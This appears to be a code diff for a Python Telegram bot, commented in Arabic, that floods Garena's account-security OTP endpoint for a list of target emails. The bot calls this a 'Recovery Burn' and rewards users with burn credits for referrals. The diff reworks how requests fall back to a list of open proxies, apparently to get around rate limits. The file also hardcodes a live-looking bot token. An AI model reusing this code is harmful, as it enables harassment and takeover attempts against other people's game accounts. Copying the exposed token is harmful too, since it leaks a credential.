@@ -18,28 +18,13 @@ BOT_TOKEN = "8776921304:AAGRrWDoNy5WWib5V3_wkIlZD_nEttflvDc"
 OTP_URL = "https://100067.connect.garena.com/game/account_security/swap:send_otp"
 INIT_URL = "https://100067.connect.garena.com/game/account_security/"
 
-# قائمة بروكسيات موسعة
+# قائمة بروكسيات (تستخدم كاحتياطي فقط)
 PROXY_LIST = [
     "http://43.134.20.79:3128",
     "http://47.251.43.113:8080",
     "http://8.219.97.248:80",
     "http://103.152.112.162:80",
-    "http://198.23.239.134:80",
-    "http://20.205.61.143:80",
-    "http://47.254.153.183:80",
-    "http://8.219.175.110:80",
-    "http://161.35.70.249:8080",
-    "http://165.22.254.40:8080",
-    "http://138.68.60.8:8080",
-    "http://206.189.144.184:8080",
-    "http://64.225.8.121:8080",
-    "http://159.65.133.197:8080",
-    "http://167.99.234.199:8080",
-    "http://139.59.1.139:8080",
-    "http://104.248.63.15:8080",
-    "http://157.245.92.194:8080",
-    "http://178.128.89.177:8080",
-    "http://143.198.228.250:8080"
+    "http://198.23.239.134:80"
 ]
 
 ALGIERS_TZ = ZoneInfo("Africa/Algiers")
@@ -53,38 +38,17 @@ logging.basicConfig(
     level=logging.INFO
 )
 
-target_emails = []  # قائمة الإيميلات
+target_emails = []
 is_running = False
 active_chat_id = None
 scheduler_task = None
 waiting_for_email_input = False
 
-# Proxy Rotation Control (تغيير البروكسي كل طلبين)
-current_proxy = None
-request_counter = 0
-
-# Referral & Credits System
-user_referrals = {}    # {user_id: count}
-referred_by = {}       # {user_id: referrer_id}
-user_burn_credits = {} # {user_id: credits_count}
+user_referrals = {}
+referred_by = {}
+user_burn_credits = {}
 
 REQUIRED_REFERRALS_PER_BURN = 5
-
-def get_rotated_proxy():
-    global current_proxy, request_counter
-    if not PROXY_LIST:
-        return None
-    
-    if current_proxy is None or request_counter >= 2:
-        proxy_url = random.choice(PROXY_LIST)
-        current_proxy = {
-            "http": proxy_url,
-            "https": proxy_url
-        }
-        request_counter = 0
-    
-    request_counter += 1
-    return current_proxy
 
 def execute_garena_request(email: str) -> tuple[bool, str]:
     session = requests.Session()
@@ -97,29 +61,36 @@ def execute_garena_request(email: str) -> tuple[bool, str]:
         "Accept-Encoding": "gzip"
     }
     
-    proxies = get_rotated_proxy()
-    
+    payload = {
+        "app_id": "100067",
+        "email": email,
+        "locale": "en_DZ"
+    }
+
+    # محاولة الإرسال المباشر أولاً (Direct Request)
     try:
-        session.get(INIT_URL, headers=headers, proxies=proxies, timeout=10)
-        payload = {
-            "app_id": "100067",
-            "email": email,
-            "locale": "en_DZ"
-        }
-        response = session.post(OTP_URL, headers=headers, data=payload, proxies=proxies, timeout=15)
-        if response.status_code == 200:
-            if '"result":0' in response.text or '"result": 0' in response.text:
+        session.get(INIT_URL, headers=headers, timeout=8)
+        response = session.post(OTP_URL, headers=headers, data=payload, timeout=10)
+        if response.status_code == 200 and ('"result":0' in response.text or '"result": 0' in response.text):
+            return True, response.text
+    except Exception:
+        pass
+
+    # في حال فشل الاتصال المباشر، يتم تجربة البروكسي
+    if PROXY_LIST:
+        proxy_url = random.choice(PROXY_LIST)
+        proxies = {"http": proxy_url, "https": proxy_url}
+        try:
+            session.get(INIT_URL, headers=headers, proxies=proxies, timeout=8)
+            response = session.post(OTP_URL, headers=headers, data=payload, proxies=proxies, timeout=10)
+            if response.status_code == 200 and ('"result":0' in response.text or '"result": 0' in response.text):
                 return True, response.text
             else:
                 return False, f"Server response: {response.text}"
-        else:
-            return False, f"Server error status: {response.status_code} - {response.text}"
-    except requests.exceptions.Timeout:
-        return False, "Connection timeout (Proxy or Server)."
-    except requests.exceptions.ConnectionError:
-        return False, "Network connection failed (Proxy Error)."
-    except Exception as err:
-        return False, f"Error: {str(err)}"
+        except Exception as err:
+            return False, f"Proxy Connection Error: {str(err)}"
+
+    return False, "Failed via Direct & Proxy attempts."
 
 def build_main_menu() -> InlineKeyboardMarkup:
     burn_button_text = "🛑 Stop Recovery Burn" if is_running else "Start Recovery Burn🔥"
@@ -138,7 +109,6 @@ def build_main_menu() -> InlineKeyboardMarkup:
 
 def build_delete_menu() -> InlineKeyboardMarkup:
     keyboard = []
-    # عرض الإيميلات لاختيار الإيميل المحدد المراد حذفه
     for idx, email in enumerate(target_emails):
         keyboard.append([
             InlineKeyboardButton(f"❌ Delete: {email}", callback_data=f"delete_single_{idx}")
@@ -434,5 +404,5 @@ if __name__ == "__main__":
     app.add_handler(CommandHandler("start", start_cmd))
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_message_handler))
-    print("Bot is running without clear all option...")
+    print("Bot is up and running...")
     app.run_polling()
